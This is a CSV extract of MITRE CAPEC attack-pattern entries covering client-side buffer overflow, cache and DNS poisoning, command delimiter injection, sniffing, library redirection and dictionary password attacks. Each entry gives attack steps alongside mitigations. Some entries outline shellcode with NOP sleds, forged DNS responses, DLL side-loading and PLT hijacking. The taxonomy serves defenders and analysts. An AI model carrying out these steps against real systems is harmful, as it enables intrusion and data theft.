CAPEC-14,Client-side Injection-induced Buffer Overflow,Detailed,Draft,"This type of attack exploits a buffer overflow vulnerability in targeted client software through injection of malicious content from a custom-built hostile service. This hostile service is created to deliver the correct content to the client software. For example, if the client-side application is a browser, the service will host a webpage that the browser loads.",N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:100::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target client-side application] The adversary identifies a target client-side application to perform the buffer overflow on. The most common are browsers. If there is a known browser vulnerability an adversary could target that.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.TECHNIQUE:Many times client side applications will be open source, so an adversary can examine the source code to identify possible injection vectors.:TECHNIQUE:Examine APIs of the client-side application and look for areas where a buffer overflow might be possible.::STEP:3:PHASE:Experiment:DESCRIPTION:[Create hostile service] The adversary creates a hostile service that will deliver content to the client-side application. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.TECHNIQUE:If the client-side application is a browser, the adversary will create a service that delivers a malicious webpage to the browser.:TECHNIQUE:Create malicious shellcode that will execute when the program execution is returned to it.:TECHNIQUE:Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Using the injection vector, the adversary delivers the content to the client-side application using the hostile service and overflows the buffer.TECHNIQUE:If the adversary is targeting a local client-side application, they just need to use the service themselves.:TECHNIQUE:If the adversary is attempting to cause an overflow on an external user's client-side application, they must get the user to attach to their service by some other means. This could be getting a user to visit their hostile webpage to target a user's browser.::",::The targeted client software communicates with an external server.::The targeted client software has a buffer overflow vulnerability.::,"::SKILL:To achieve a denial of service, an attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap requires a more in-depth knowledge and higher skill level.:LEVEL:High::",N/A,::An example of indicator is when the client software crashes after executing code downloaded from a hostile server.::,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Denial of Service::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::,"::The client software should not install untrusted code from a non-authenticated server.::The client software should have the latest patches and should be audited for vulnerabilities before being used to communicate with potentially hostile servers.::Perform input validation for length of buffer inputs.::Use a language or compiler that performs automatic bounds checking.::Use an abstraction library to abstract away risky APIs. Not a complete solution.::Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.::Ensure all buffer uses are consistently bounds-checked.::Use OS-level preventative functionality. Not a complete solution.::","::Attack Example: Buffer Overflow in Internet Explorer 4.0 Via EMBED Tag Authors often use <EMBED> tags in HTML documents. For example <EMBED TYPE=audio/midi SRC=/path/file.mid AUTOSTART=true> If an attacker supplies an overly long path in the SRC= directive, the mshtml.dll component will suffer a buffer overflow. This is a standard example of content in a Web page being directed to exploit a faulty module in the system. There are potentially thousands of different ways data can propagate into a given system, thus these kinds of attacks will continue to be found in the wild.::",::120::353::118::119::74::20::680::697::,N/A,N/A,https://capec.mitre.org/data/definitions/14.html
CAPEC-141,Cache Poisoning,Standard,Draft,"An attacker exploits the functionality of cache technologies to cause specific data to be cached that aids the attackers' objectives. This describes any attack whereby an attacker places incorrect or harmful material in cache. The targeted cache can be an application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache). Until the cache is refreshed, most applications or clients will treat the corrupted cache value as valid. This can lead to a wide range of exploits including redirecting web browsers towards sites that install malware and repeatedly incorrect calculations based on the incorrect value.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:161::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify and explore caches] Use tools to sniff traffic and scan a network in order to locate application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache) that may have vulnerabilities. Look for poisoning point in cache table entries.TECHNIQUE:Run tools that check available entries in the cache.::STEP:2:PHASE:Experiment:DESCRIPTION:[Cause specific data to be cached] An attacker sends bogus request to the target, and then floods responses that trick a cache to remember malicious responses, which are wrong answers of queries.TECHNIQUE:Intercept or modify a query, or send a bogus query with known credentials (such as transaction ID).::STEP:3:PHASE:Exploit:DESCRIPTION:[Redirect users to malicious website] As the attacker succeeds in exploiting the vulnerability, they are able to manipulate and interpose malicious response data to targeted victim queries.TECHNIQUE:Intercept or modify a query, or send a bogus query with known credentials (such as transaction ID).:TECHNIQUE:Adversary-in-the-Middle attacks (CAPEC-94) intercept secure communication between two parties.::",::The attacker must be able to modify the value stored in a cache to match a desired value.::The targeted application must not be able to detect the illicit modification of the cache and must trust the cache value in its calculations.::,::SKILL:To overwrite/modify targeted cache:LEVEL:Medium::,N/A,N/A,N/A,"::Configuration: Disable client side caching.::Implementation: Listens for query replies on a network, and sends a notification via email when an entry changes.::","::DNS cache poisoning example In this example, an attacker sends request to a local DNS server to look up www.example .com. The associated IP address of www.example.com is 1.3.5.7. Local DNS usually caches IP addresses and do not go to remote DNS every time. Since the local record is not found, DNS server tries to connect to remote DNS for queries. However, before the remote DNS returns the right IP address 1.3.5.7, the attacker floods local DNS with crafted responses with IP address 2.4.6.8. The result is that 2.4.6.8 is stored in DNS cache. Meanwhile, 2.4.6.8 is associated with a malicious website www.maliciousexampsle.com When users connect to www.example.com, the local DNS will direct it to www.maliciousexample.com, this works as part of a Pharming attack.::",::348::345::349::346::441::,TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Cache Poisoning::,N/A,https://capec.mitre.org/data/definitions/141.html
CAPEC-142,DNS Cache Poisoning,Detailed,Draft,A domain name server translates a domain name (such as www.example.com) into an IP address that Internet hosts use to contact Internet resources. An adversary modifies a public DNS cache to cause certain names to resolve to incorrect addresses that the adversary specifies. The result is that client applications that rely upon the targeted cache for domain name resolution will be directed not to the actual address of the specified domain name but to some other address. Adversaries can use this to herd clients to sites that install malware on the victim's computer or to masquerade as part of a Pharming attack.,N/A,High,High,::NATURE:ChildOf:CAPEC ID:141::NATURE:CanPrecede:CAPEC ID:89::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Explore resolver caches] Check DNS caches on local DNS server and client's browser with DNS cache enabled.TECHNIQUE:Run tools that check the resolver cache in the memory to see if it contains a target DNS entry.:TECHNIQUE:Figure out if the client's browser has DNS cache enabled.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt sending crafted records to DNS cache] A request is sent to the authoritative server for target website and wait for the iterative name resolver. An adversary sends bogus request to the DNS local server, and then floods responses that trick a DNS cache to remember malicious responses, which are wrong answers of DNS query.TECHNIQUE:Adversary must know the transaction ID by intercepting a DNS query, or sending a bogus query with known transaction ID.:TECHNIQUE:If the transaction ID used to identify each query instance is randomized in some new DNS software, the attack must guess the transaction ID. Slow the response of the real DNS server by causing Denial-of-service. This gives adversaries enough time to guess transaction:TECHNIQUE:Adversary crafts DNS response with the same transaction ID as in the request. The adversary sends out DNS responses before the authorized DNS server. This forces DNS local cache stores fake DNS response (wrong answer). The fake DNS responses usually include a malicious website's IP address.::STEP:3:PHASE:Exploit:DESCRIPTION:[Redirect users to malicious website] As the adversary succeeds in exploiting the vulnerability, the victim connects to a malicious site using a good web site's domain name.TECHNIQUE:Redirecting Web traffic to a site that looks enough like the original so as to not raise any suspicion.:TECHNIQUE:Adversary-in-the-Middle (CAPEC-94) intercepts secure communication between two parties.::",::A DNS cache must be vulnerable to some attack that allows the adversary to replace addresses in its lookup table.Client applications must trust the corrupted cashed values and utilize them for their domain name resolutions.::,::SKILL:To overwrite/modify targeted DNS cache:LEVEL:Medium::,"::The adversary must have the resources to modify the targeted cache. In addition, in most cases the adversary will wish to host the sites to which users will be redirected, although in some cases redirecting to a third party site will accomplish the adversary's goals.::",N/A,N/A,"::Configuration: Make sure your DNS servers have been updated to the latest versions::Configuration: UNIX services like rlogin, rsh/rcp, xhost, and nfs are all susceptible to wrong information being held in a cache. Care should be taken with these services so they do not rely upon DNS caches that have been exposed to the Internet.::Configuration: Disable client side DNS caching.::","::In this example, an adversary sends request to a local DNS server to look up www.example .com. The associated IP address of www.example.com is 1.3.5.7. Local DNS usually caches IP addresses and do not go to remote DNS every time. Since the local record is not found, DNS server tries to connect to remote DNS for queries. However, before the remote DNS returns the right IP address 1.3.5.7, the adversary floods local DNS with crafted responses with IP address 2.4.6.8. The result is that 2.4.6.8 is stored in DNS cache. Meanwhile, 2.4.6.8 is associated with a malicious website www.maliciousexampsle.com When users connect to www.example.com, the local DNS will direct it to www.maliciousexample.com, this works as part of a Pharming attack.::",::348::345::349::346::441::350::,N/A,N/A,https://capec.mitre.org/data/definitions/142.html
CAPEC-145,Checksum Spoofing,Detailed,Draft,"An adversary spoofs a checksum message for the purpose of making a payload appear to have a valid corresponding checksum. Checksums are used to verify message integrity. They consist of some value based on the value of the message they are protecting. Hash codes are a common checksum mechanism. Both the sender and recipient are able to compute the checksum based on the contents of the message. If the message contents change between the sender and recipient, the sender and recipient will compute different checksum values. Since the sender's checksum value is transmitted with the message, the recipient would know that a modification occurred. In checksum spoofing an adversary modifies the message body and then modifies the corresponding checksum so that the recipient's checksum calculation will match the checksum (created by the adversary) in the message. This would prevent the recipient from realizing that a change occurred.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:148::,N/A,"::The adversary must be able to intercept a message from the sender (keeping the recipient from getting it), modify it, and send the modified message to the recipient.::The sender and recipient must use a checksum to protect the integrity of their message and transmit this checksum in a manner where the adversary can intercept and modify it.::The checksum value must be computable using information known to the adversary. A cryptographic checksum, which uses a key known only to the sender and recipient, would thwart this attack.::",N/A,::The adversary must have a utility that can intercept and modify messages between the sender and recipient.::,N/A,N/A,N/A,N/A,::354::,N/A,N/A,https://capec.mitre.org/data/definitions/145.html
CAPEC-147,XML Ping of the Death,Detailed,Draft,"An attacker initiates a resource depletion attack where a large number of small XML messages are delivered at a sufficiently rapid rate to cause a denial of service or crash of the target. Transactions such as repetitive SOAP transactions can deplete resources faster than a simple flooding attack because of the additional resources used by the SOAP protocol and the resources necessary to process SOAP messages. The transactions used are immaterial as long as they cause resource utilization on the target. In other words, this is a normal flooding attack augmented by using messages that will require extra processing on the target.",N/A,Low,Medium,::NATURE:ChildOf:CAPEC ID:528::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using a browser or an automated tool, an attacker records all instance of web services to process XML requests.TECHNIQUE:Use an automated tool to record all instances of URLs to process XML requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes XML requests.::STEP:2:PHASE:Exploit:DESCRIPTION:[Launch a resource depletion attack] The attacker delivers a large number of small XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.TECHNIQUE:Send a large number of crafted small XML messages to the target URL.::",::The target must receive and process XML transactions.::,::SKILL:To send small XML messages:LEVEL:Low::SKILL:To use distributed network to launch the attack:LEVEL:High::,"::Transaction generator(s)/source(s) and ability to cause arrival of messages at the target with sufficient rapidity to overload target. Larger targets may be able to handle large volumes of requests so the attacker may require significant resources (such as a distributed network) to affect the target. However, the resources required of the attacker would be less than in the case of a simple flooding attack against the same target.::",N/A,::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption DoS: resource consumption (other)::,::Design: Build throttling mechanism into the resource allocation. Provide for a timeout mechanism for allocated resources whose transaction does not complete within a specified interval.::Implementation: Provide for network flow control and traffic shaping to control access to the resources.::,"::Consider the case of attack performed against the createCustomerBillingAccount Web Service for an online store. In this case, the createCustomerBillingAccount Web Service receives a huge number of simultaneous requests, containing nonsense billing account creation information (the small XML messages). The createCustomerBillingAccount Web Services may forward the messages to other Web Services for processing. The application suffers from a high load of requests, potentially leading to a complete loss of availability the involved Web Service.::",::400::770::,N/A,N/A,https://capec.mitre.org/data/definitions/147.html
CAPEC-148,Content Spoofing,Meta,Stable,"An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.",N/A,Medium,Medium,N/A,N/A,"::The target must provide content but fail to adequately protect it against modification.The adversary must have the means to alter data to which they are not authorized. If the content is to be modified in transit, the adversary must be able to intercept the targeted messages.::",N/A,"::If the content is to be modified in transit, the adversary requires a tool capable of intercepting the target's communication and generating/creating custom packets to impact the communications. In some variants, the targeted content is altered so that all or some of it is redirected towards content published by the attacker (for example, images and frames in the target's web site might be modified to be loaded from a source controlled by the attacker). In these cases, the attacker requires the necessary resources to host the replacement content.::",N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data A successful content spoofing attack compromises the integrity of the application data.::,N/A,N/A,::345::,TAXONOMY NAME:WASC:ENTRY ID:12:ENTRY NAME:Content Spoofing::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Content Spoofing::,N/A,https://capec.mitre.org/data/definitions/148.html
CAPEC-15,Command Delimiters,Standard,Draft,"An attack of this type exploits a programs' vulnerabilities that allows an attacker's commands to be concatenated onto a legitimate command with the intent of targeting other resources such as the file system or database. The system that uses a filter or denylist input validation, as opposed to allowlist validation is vulnerable to an attacker who predicts delimiters (or combinations of delimiters) not present in the filter or denylist. As with other injection attacks, the attacker uses the command delimiter payload as an entry point to tunnel through the application and activate additional attacks through SQL queries, shell commands, network scanning, and so on.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:137::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Assess Target Runtime Environment] In situations where the runtime environment is not implicitly known, the attacker makes connections to the target system and tries to determine the system's runtime environment. Knowing the environment is vital to choosing the correct delimiters.TECHNIQUE:Port mapping using network connection-based software (e.g., nmap, nessus, etc.):TECHNIQUE:Port mapping by exploring the operating system (netstat, sockstat, etc.):TECHNIQUE:TCP/IP Fingerprinting:TECHNIQUE:Induce errors to find informative error messages::STEP:2:PHASE:Explore:DESCRIPTION:[Survey the Application] The attacker surveys the target application, possibly as a valid and authenticated userTECHNIQUE:Spidering web sites for all available links:TECHNIQUE:Inventory all application inputs::STEP:3:PHASE:Experiment:DESCRIPTION:[Attempt delimiters in inputs] The attacker systematically attempts variations of delimiters on known inputs, observing the application's response each time.TECHNIQUE:Inject command delimiters using network packet injection tools (netcat, nemesis, etc.):TECHNIQUE:Inject command delimiters using web test frameworks (proxies, TamperData, custom programs, etc.):TECHNIQUE:Enter command delimiters directly in input fields.::STEP:4:PHASE:Exploit:DESCRIPTION:[Use malicious command delimiters] The attacker uses combinations of payload and carefully placed command delimiters to attack the software.::",::Software's input validation or filtering must not detect and block presence of additional malicious command.::,"::SKILL:The attacker has to identify injection vector, identify the specific commands, and optionally collect the output, i.e. from an interactive session.:LEVEL:Medium::","::Ability to communicate synchronously or asynchronously with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.::",N/A,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,"::Design: Perform allowlist validation against a positive specification for command length, type, and parameters.::Design: Limit program privileges, so if commands circumvent program input validation or filter routines then commands do not running under a privileged account::Implementation: Perform input validation for all remote content.::Implementation: Use type conversions such as JDBC prepared statements.::","::By appending special characters, such as a semicolon or other commands that are executed by the target process, the attacker is able to execute a wide variety of malicious commands in the target process space, utilizing the target's inherited permissions, against any resource the host has access to. The possibilities are vast including injection attacks against RDBMS (SQL Injection), directory servers (LDAP Injection), XML documents (XPath and XQuery Injection), and command line shells. In many injection attacks, the results are converted back to strings and displayed to the client process such as a web browser without tripping any security alarms, so the network firewall does not log any out of the ordinary behavior. LDAP servers house critical identity assets such as user, profile, password, and group information that is used to authenticate and authorize users. An attacker that can query the directory at will and execute custom commands against the directory server is literally working with the keys to the kingdom in many enterprises. When user, organizational units, and other directory objects are queried by building the query string directly from user input with no validation, or other conversion, then the attacker has the ability to use any LDAP commands to query, filter, list, and crawl against the LDAP server directly in the same manner as SQL injection gives the ability to the attacker to run SQL commands on the database.::",::146::77::184::78::185::93::140::157::138::154::697::,N/A,N/A,https://capec.mitre.org/data/definitions/15.html
CAPEC-150,Collect Data from Common Resource Locations,Standard,Draft,"An adversary exploits well-known locations for resources for the purposes of undermining the security of the target. In many, if not most systems, files and resources are organized in a default tree structure. This can be useful for adversaries because they often know where to look for resources or files that are necessary for attacks. Even when the precise location of a targeted resource may not be known, naming conventions may indicate a small area of the target machine's file tree where the resources are typically located. For example, configuration files are normally stored in the /etc director on Unix systems. Adversaries can take advantage of this to commit other types of attacks.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:116::,N/A,"::The targeted applications must either expect files to be located at a specific location or, if the location of the files can be configured by the user, the user either failed to move the files from the default location or placed them in a conventional location for files of the given type.::",N/A,"::None: No specialized resources are required to execute this type of attack. In some cases, the attacker need not even have direct access to the locations on the target computer where the targeted resources reside.::",N/A,N/A,N/A,"::An adversary can use a technique called Bluesnarfing to retrieve data from Bluetooth enabled devices in which they know where the data is located. This is done by connecting to the device’s Object Exchange (OBEX) Push Profile and making OBEX GET requests for known filenames (contact lists, photos, recent calls). Bluesnarfing was patched shortly after its discovery in 2003 and will only work on devices created before or during this time.::",::552::1239::1258::1266::1272::1323::1324::1330::,TAXONOMY NAME:ATTACK:ENTRY ID:1119:ENTRY NAME:Automated Collection::,N/A,https://capec.mitre.org/data/definitions/150.html
CAPEC-151,Identity Spoofing,Meta,Stable,"Identity Spoofing refers to the action of assuming (i.e., taking on) the identity of some other entity (human or non-human) and then using that identity to accomplish a goal. An adversary may craft messages that appear to come from a different principle or use stolen / spoofed authentication credentials.",N/A,Medium,Medium,N/A,N/A,::The identity associated with the message or resource must be removable or modifiable in an undetectable way.::,N/A,::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Authentication:SCOPE:Access ControlTECHNICAL IMPACT:Gain Privileges::,"::Employ robust authentication processes (e.g., multi-factor authentication).::",N/A,::287::,N/A,N/A,https://capec.mitre.org/data/definitions/151.html
CAPEC-153,Input Data Manipulation,Meta,Draft,"An attacker exploits a weakness in input validation by controlling the format, structure, and composition of data to an input-processing interface. By supplying input of a non-standard or unexpected form an attacker can adversely impact the security of the target.",N/A,N/A,Medium,N/A,N/A,::The target must accept user data for processing and the manner in which this data is processed must depend on some aspect of the format or flags that the attacker can control.::,N/A,::None: No specialized resources are required to execute this type of attack.::,N/A,N/A,N/A,N/A,::20::,N/A,N/A,https://capec.mitre.org/data/definitions/153.html
CAPEC-155,Screen Temporary Files for Sensitive Information,Detailed,Draft,"An adversary exploits the temporary, insecure storage of information by monitoring the content of files used to store temp data during an application's routine execution flow. Many applications use temporary files to accelerate processing or to provide records of state across multiple executions of the application. Sometimes, however, these temporary files may end up storing sensitive information. By screening an application's temporary files, an adversary might be able to discover such sensitive information. For example, web browsers often cache content to accelerate subsequent lookups. If the content contains sensitive information then the adversary could recover this from the web cache.",N/A,Medium,Medium,::NATURE:ChildOf:CAPEC ID:150::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Look for temporary files in target application] An adversary will try to discover temporary files in a target application. Knowledge of where the temporary files are being stored is important information.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt to read temporary files] An adversary will attempt to read any temporary files they may have discovered through normal means.TECHNIQUE:Attempt to get the file by querying the file path to a web server:TECHNIQUE:Using a remote shell into an application, read temporary files and send out information remotely if necessary:TECHNIQUE:Recover temporary information from a user's browser cache::STEP:3:PHASE:Exploit:DESCRIPTION:[Use function weaknesses to gain access to temporary files] If normal means to read temporary files did not work, an adversary will attempt to exploit weak temporary file functions to gain access to temporary files.TECHNIQUE:Some C functions such as tmpnam(), tempnam(), and mktemp() will create a temporary file with a unique name, but do not stop an adversary from creating a file of the same name before it is opened by the application. Because these functions do not create file names that are sufficiently random, an adversary will try to make a file of the same name, causing a collision, and possibly altering file permissions for the temporary file so that it is able to be read.:TECHNIQUE:Similar to the last technique, an adversary might also create a file name collision using a linked file in a unix system such that the temporary file contents written out by the application write to a file of the adversaries choosing, allowing them to read the file contents.::",::The target application must utilize temporary files and must fail to adequately secure them against other parties reading them.::,N/A,"::Because some application may have a large number of temporary files and/or these temporary files may be very large, an adversary may need tools that help them quickly search these files for sensitive information. If the adversary can simply copy the files to another location and if the speed of the search is not important, the adversary can still perform the attack without any special resources.::",N/A,N/A,N/A,N/A,::377::,N/A,N/A,https://capec.mitre.org/data/definitions/155.html
CAPEC-157,Sniffing Attacks,Standard,Draft,"In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient. Sniffing Attacks are similar to Adversary-In-The-Middle attacks (CAPEC-94), but are entirely passive. AiTM attacks are predominantly active and often alter the content of the communications themselves.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:117::NATURE:CanPrecede:CAPEC ID:652::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Communication Mechanism] The adversary determines the nature and mechanism of communication between two components, looking for opportunities to exploit.TECHNIQUE:Look for application documentation that might describe a communication mechanism used by a target.::STEP:2:PHASE:Experiment:DESCRIPTION:[Position In Between Targets] The adversary positions themselves somewhere in the middle of the two components. If the communication is encrypted, the adversary will need to act as a proxy and route traffic between the components, exploiting a flaw in the encryption mechanism. Otherwise, the adversary can just observe the communication at either end.TECHNIQUE:Use Wireshark or some other packet capturing tool to capture traffic on a network.:TECHNIQUE:Install spyware on a client that will intercept outgoing packets and route them to their destination as well as route incoming packets back to the client.:TECHNIQUE:Exploit a weakness in an encrypted communication mechanism to gain access to traffic. Look for outdated mechanisms such as SSL.::STEP:3:PHASE:Exploit:DESCRIPTION:[Listen to Communication] The adversary observes communication, but does not alter or block it. The adversary gains access to sensitive information and can potentially utilize this information in a malicious way.::",::The target data stream must be transmitted on a medium to which the adversary has access.::,N/A,"::The adversary must be able to intercept the transmissions containing the data of interest. Depending on the medium of transmission and the path the data takes between the sender and recipient, the adversary may require special equipment and/or require that this equipment be placed in specific locations (e.g., a network sniffing tool)::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,::Encrypt sensitive information when transmitted on insecure mediums to prevent interception.::,N/A,::311::,N/A,N/A,https://capec.mitre.org/data/definitions/157.html
CAPEC-158,Sniffing Network Traffic,Detailed,Draft,"In this attack pattern, the adversary monitors network traffic between nodes of a public or multicast network in an attempt to capture sensitive information at the protocol level. Network sniffing applications can reveal TCP/IP, DNS, Ethernet, and other low-level network communication information. The adversary takes a passive role in this attack pattern and simply observes and analyzes the traffic. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the target information.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:157::,N/A,"::The target must be communicating on a network protocol visible by a network sniffing application.::The adversary must obtain a logical position on the network from intercepting target network traffic is possible. Depending on the network topology, traffic sniffing may be simple or challenging. If both the target sender and target recipient are members of a single subnet, the adversary must also be on that subnet in order to see their traffic communication.::",::SKILL:Adversaries can obtain and set up open-source network sniffing tools easily.:LEVEL:Low::,"::A tool with the capability of presenting network communication traffic (e.g., Wireshark, tcpdump, Cain and Abel, etc.).::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,::Obfuscate network traffic through encryption to prevent its readability by network sniffers.::Employ appropriate levels of segmentation to your network in accordance with best practices.::,N/A,::311::,TAXONOMY NAME:ATTACK:ENTRY ID:1040:ENTRY NAME:Network Sniffing::,N/A,https://capec.mitre.org/data/definitions/158.html
CAPEC-159,Redirect Access to Libraries,Standard,Stable,"An adversary exploits a weakness in the way an application searches for external libraries to manipulate the execution flow to point to an adversary supplied library or code base. This pattern of attack allows the adversary to compromise the application or server via the execution of unauthorized code. An application typically makes calls to functions that are a part of libraries external to the application. These libraries may be part of the operating system or they may be third party libraries. If an adversary can redirect an application's attempts to access these libraries to other libraries that the adversary supplies, the adversary will be able to force the targeted application to execute arbitrary code. This is especially dangerous if the targeted application has enhanced privileges. Access can be redirected through a number of techniques, including the use of symbolic links, search path modification, and relative path manipulation.",N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:154::NATURE:CanPrecede:CAPEC ID:185::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify Target] The adversary identifies the target application and determines what libraries are being used.TECHNIQUE:Find public source code and identify library dependencies.:TECHNIQUE:Gain access to the system hosting the application and look for libraries in common locations.::STEP:2:PHASE:Experiment:DESCRIPTION:[Deploy Malicious Libraries] The adversary crafts malicious libraries and deploys them on the system where the application is running, or in a remote location that can be loaded by the application.::STEP:3:PHASE:Exploit:DESCRIPTION:[Redirect Library Calls to Malicious Library] Once the malicious library crafted by the adversary is deployed, the adversary will manipulate the flow of the application such that it calls the malicious library. This can be done in a variety of ways based on how the application is loading and calling libraries.TECHNIQUE:Poison the DNS cache of the system so that it loads a malicious library from a remote location hosted by the adversary instead of the legitimate location:TECHNIQUE:Create a symlink that tricks the application into thinking that a malicious library is the legitimate library.:TECHNIQUE:Use DLL side-loading to place a malicious verison of a DLL in the windows directory.::",::The target must utilize external libraries and must fail to verify the integrity of these libraries before using them.::,::SKILL:To modify the entries in the configuration file pointing to malicious libraries:LEVEL:Low::SKILL:To force symlink and timing issues for redirecting access to libraries:LEVEL:Medium::SKILL:To reverse engineering the libraries and inject malicious code into the libraries:LEVEL:High::,N/A,N/A,::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::,::Implementation: Restrict the permission to modify the entries in the configuration file.::Implementation: Check the integrity of the dynamically linked libraries before use them.::Implementation: Use obfuscation and other techniques to prevent reverse engineering the libraries.::,"::In this example, the attacker using ELF infection that redirects the Procedure Linkage Table (PLT) of an executable allowing redirection to be resident outside of the infected executable. The algorithm at the entry point code is as follows... ? mark the text segment writeable ? save the PLT(GOT) entry ? replace the PLT(GOT) entry with the address of the new lib call The algorithm in the new library call is as follows... ? do the payload of the new lib call ? restore the original PLT(GOT) entry ? call the lib call ? save the PLT(GOT) entry again (if its changed) ? replace the PLT(GOT) entry with the address of the new lib call::",::706::,TAXONOMY NAME:ATTACK:ENTRY ID:1574.008:ENTRY NAME:Hijack Execution Flow:Path Interception by Search Order Hijacking::,N/A,https://capec.mitre.org/data/definitions/159.html
CAPEC-16,Dictionary-based Password Attack,Detailed,Draft,"An attacker tries each of the words in a dictionary as passwords to gain access to the system via some user's account. If the password chosen by the user was a word within the dictionary, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern. Dictionary Attacks differ from similar attacks such as Password Spraying (CAPEC-565) and Credential Stuffing (CAPEC-600), since they leverage unknown username/password combinations and don't care about inducing account lockouts.",N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:49::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine application's/system's password policy] Determine the password policies of the target application/system.TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).::STEP:2:PHASE:Explore:DESCRIPTION:[Select dictionaries] Pick the dictionaries to be used in the attack (e.g. different languages, specific terminology, etc.)TECHNIQUE:Select dictionary based on particular users' preferred languages.:TECHNIQUE:Select dictionary based on the application/system's supported languages.::STEP:3:PHASE:Explore:DESCRIPTION:[Determine username(s) to target] Determine username(s) whose passwords to crack.TECHNIQUE:Obtain username(s) by sniffing network packets.:TECHNIQUE:Obtain username(s) by querying application/system (e.g. if upon a failed login attempt, the system indicates whether the entered username was valid or not):TECHNIQUE:Obtain usernames from filesystem (e.g. list of directories in C:Documents and Settings in Windows, and list in /etc/passwd in UNIX-like systems)::STEP:4:PHASE:Exploit:DESCRIPTION:[Use dictionary to crack passwords.] Use a password cracking tool that will leverage the dictionary to feed passwords to the system and see if they work.TECHNIQUE:Try all words in the dictionary, as well as common misspellings of the words as passwords for the chosen username(s).:TECHNIQUE:Try common combinations of words in the dictionary, as well as common misspellings of the combinations as passwords for the chosen username(s).::",::The system uses one factor password based authentication.::The system does not have a sound password policy that is being enforced.::The system does not implement an effective password throttling mechanism.::,::SKILL:A variety of password cracking tools and dictionaries are available to launch this type of an attack.:LEVEL:Low::,"::A machine with sufficient resources for the job (e.g. CPU, RAM, HD). Applicable dictionaries are required. Also a password cracking tool or a custom script that leverages the dictionary database to launch 